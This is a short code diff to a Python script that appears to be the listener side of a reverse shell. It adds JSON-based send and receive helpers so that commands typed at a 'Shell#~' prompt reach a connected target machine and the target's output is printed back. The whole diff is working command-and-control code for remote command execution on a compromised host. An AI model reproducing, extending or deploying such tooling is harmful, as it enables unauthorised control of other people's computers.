@@ -4,17 +4,30 @@
 
 import socket
 from termcolor import colored
-import subprocess
+import json
+
+def reliable_send(data):
+    jsonData = json.dumps(data)
+    target.send(jsonData.encode())
+
+def reliable_recv():
+    data = b''
+    while True:
+        try:
+            data = data + target.recv(1024)
+            return json.loads(data)
+        except ValueError:
+            continue
 
 def shell():
     while True:
         command = input("Shell#~%s: " % str(ip))
-        target.send(command.encode())
+        reliable_send(command)
         if command == 'exit':
             break
         else:
-            result = target.recv(1024)
-            print(result.decode())
+            result = reliable_recv()
+            print(result)
 
 def server():
     global sock
